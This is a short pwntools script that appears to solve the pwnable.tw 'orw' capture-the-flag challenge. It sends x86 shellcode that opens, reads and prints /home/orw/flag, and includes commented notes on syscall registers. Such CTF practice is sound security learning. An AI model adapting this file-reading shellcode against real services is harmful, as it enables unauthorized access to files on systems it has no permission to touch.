from pwn import *

p = remote('chall.pwnable.tw', 10001)
"""
----open----
push filename to %esp
eax = 5
ebx = esp
ecx: access mode: read-only (0), write-only (1), read-write (2)
edx: file permission

----read----
eax = 3
ebx: returned file descriptor(eax)
ecx: pointer to input buffer = esi
edx: number of bytes readable

----write---
eax = 4
ebx: file descriptor(fd of stdout: 1)
ecx: pointer to input buffer = esi
edx: number of bytes to write (eax)

"""
shellcode = asm('\n'.join([
    'push {:d}'.format(u32(b'ag\0\0')), 
    'push {:d}'.format(u32(b'w/fl')), 
    'push {:d}'.format(u32(b'e/or')), 
    'push {:d}'.format(u32(b'/hom')), 
    'xor edx, edx', 
    'xor ecx, ecx', 
    'mov ebx, esp', 
    'mov eax, 0x5',
    'int 0x80',

    'mov ebx, eax', 
    'mov eax, 0x3', 
    'mov ecx, esi', 
    'mov edx, 0x100', 
    'int 0x80',

    'mov edx, eax', 
    'mov eax, 0x4', 
    'mov ebx, 0x1', 
    'mov ecx, esi', 
    'int 0x80' 
]))

p.recvuntil(b'shellcode:')
p.sendline(shellcode)
p.interactive()

# p.recv()[:4]
